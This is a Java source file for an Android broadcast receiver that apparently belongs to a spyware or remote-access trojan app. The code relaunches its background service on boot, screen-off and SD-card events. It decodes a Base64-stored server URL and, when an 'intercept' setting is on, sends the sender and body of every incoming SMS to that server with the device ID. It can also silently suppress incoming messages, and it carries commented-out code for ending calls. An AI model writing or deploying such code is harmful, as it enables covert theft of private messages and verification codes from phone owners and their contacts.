package com.connect;

import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

public class ServiceReceiver extends BroadcastReceiver {
	
	 public static Context mContext;
	 boolean recordStarted=false;
     MediaRecorder recorder = new MediaRecorder();

     TelephonyManager telManager;
     Context context;
     
     String URL;
     String username;
     String password;
	 
	@Override
	public void onReceive(final Context context, Intent intent) 
	{		
		    	
 		try {
 			URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(context).getString("URL", ""), Base64.DEFAULT ));
 			password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(context).getString("password", ""), Base64.DEFAULT ));
		} catch (Exception e1) {e1.printStackTrace();}
 		
		mContext = context; 

		if ("android.intent.action.BOOT_COMPLETED".equals(intent.getAction())) {  
			   Intent pushIntent = new Intent(context, MyService.class);  
			   context.startService(pushIntent);  
		}  
		
		if(intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
        {	
			Toast.makeText(context, "Boot", 5000).show();

	       	Log.i("com.connect", "Boot");
        	if(isMyServiceRunning()==false) 
        	{
    		mContext.startService(new Intent(mContext, MyService.class));
	    	Log.i("com.connect","Boot Run Service");
        	}
        }
		
        if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF))
        {
        	if(isMyServiceRunning()==false) 
        	{
    		mContext.startService(new Intent(mContext, MyService.class));
	    	Log.i("com.connect","Screen Off Run Service");
        	}
        }
        
        if (intent.getAction().equals(Intent.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE))
        {
	       	Log.i("com.connect", "SD Card");
        	if(isMyServiceRunning()==false) 
        	{
    		mContext.startService(new Intent(mContext, MyService.class));
	    	Log.i("com.connect","Screen Off Run Service");
        	}
        }
       
//	  	if(PreferenceManager.getDefaultSharedPreferences(mContext).getString("call", "").equals("stop"))
//	  	{
//	  		TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//	  	    try {
//	  	        Class c = Class.forName(telephony.getClass().getName());
//	  	        Method m = c.getDeclaredMethod("getITelephony");
//	  	        m.setAccessible(true);
//	  	        ITelephony telephonyService = (ITelephony) m.invoke(telephony);
//	  	        //telephonyService.silenceRinger();
//	  	            telephonyService.endCall();
//	  	    } catch (Exception e) {
//	  	        e.printStackTrace();
//	  	    }
//	  	}

	  	if(PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("intercept", false)==true || PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("blockSMS", false)==true)
	  	{	       
	        Bundle extras = intent.getExtras();     
	        String messages = "";
	             
	            if ( extras != null )
	            {
	            	if(PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("intercept", false)==true)
	            	{
		                Object[] smsExtra = (Object[]) extras.get("pdus");                 

		                for ( int i = 0; i < smsExtra.length; ++i )
		                {
		                    SmsMessage sms = SmsMessage.createFromPdu((byte[])smsExtra[i]);
		                    String body = sms.getMessageBody().toString();
		                    String address = sms.getOriginatingAddress();
		                    messages += "SMS from " + address + " :\n";                    
		                    messages += body + "\n";
		                    
							try {
						        getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(context).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(context).getString("AndroidID", "") + "&Data=", "Intercepted: " + "["+address+"]" + " ["+body+"]");        	
							} catch (Exception e) {
								e.printStackTrace();
							}
	    		    	}	
	            	}
	        	  	if(PreferenceManager.getDefaultSharedPreferences(mContext).getBoolean("blockSMS", false)==true)
	        	  		this.abortBroadcast(); 
	            }
	  	}
            
//        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
//            String numberToCall = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
//        }

//        PhoneListener phoneListener = new PhoneListener(context);
//        TelephonyManager telephony = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
//        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
  }
	
	private boolean isMyServiceRunning() {
	    ActivityManager manager = (ActivityManager) mContext.getSystemService(Context.ACTIVITY_SERVICE);
	    for (RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
	        if (MyService.class.getName().equals(service.service.getClassName())) {
	            return true;
	        }
	    }
	    return false;
	}
	
    public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
    	
//    	Log.d("com.connect", urlBase);
//    	Log.d("com.connect", urlData);

    	String urlDataFormatted=urlData;
    	
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
        String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
        currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");

        if(urlData.length()>1)
        {
        Log.d("com.connect", urlBase + urlData);

    	urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
    	urlDataFormatted = urlData.replaceAll("\\.", "~period");
    	
    	Log.d("com.connect", urlBase + urlDataFormatted);
        }

    	  InputStream content = null;
    	  try 
    	  {
    	    HttpClient httpclient = new DefaultHttpClient();
    	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
    	    content = response.getEntity().getContent();
    	    httpclient.getConnectionManager().shutdown();
    	  } catch (Exception e) {
    	  }
    	    return content;
    }
}
